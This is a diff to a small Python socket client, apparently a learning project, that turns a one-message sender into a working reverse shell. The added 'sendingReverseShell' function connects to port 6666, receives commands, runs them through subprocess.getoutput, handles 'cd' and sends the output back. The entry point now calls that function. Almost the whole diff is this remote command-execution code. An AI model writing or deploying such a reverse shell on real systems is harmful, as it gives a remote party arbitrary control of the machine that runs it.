@@ -1,18 +1,72 @@
 #!/usr/bin/env python
+# coding=utf-8
 
 import socket
+import os
+import subprocess
+import sys
 
-def client():
-    # [1]_ [2]_
+
+
+def sendingData():
     s = socket.socket()
     ip = socket.gethostname()
     host = ip
     port = 9999
-    message = b'allo server!'
-
+    quitting = False
     s.connect((host, port))
-    s.send(message)
-    s.close
+
+    while not quitting:
+        message = input('> ')
+        if message == "exit":
+            quitting = True
+            s.send(b'exit')
+            s.close
+
+        s.send(bytes(message, "UTF-8"))
+
+    
+
+def sendingReverseShell():
+    s = socket.socket()
+    ip = socket.gethostname()
+    host = ip
+    port = 6666
+    quitting = False
+    s.connect((host, port))
+    SEP = "<sep>"
+    output = ""
+    cwd = os.getcwd()
+    message = f"{cwd}"
+    s.send(bytes(message, "UTF-8"))
+    while not quitting:
+        # Sendind first message
+        cwd = os.getcwd()
+        message = f"{output}{SEP}{cwd}"
+        s.send(bytes(message, "UTF-8"))
+
+        # Waiting for a command
+        command = s.recv(1024).decode("UTF-8")
+        commandArgs = command.split()
+
+        if command.lower() == "exit":
+            quitting = True
+            s.send(b'exit')
+            s.close()
+        if commandArgs[0].lower() == "cd":
+            try:
+                os.chdir(' '.join(commandArgs[1:]))
+            except FileNotFoundError as e:
+                output = str(e)
+            else:
+                output = ""
+        else:
+            output = subprocess.getoutput(command)
+        
+
+def client():
+    # [1]_ [2]_
+    sendingReverseShell()
 
 if __name__ == "__main__":
    client()
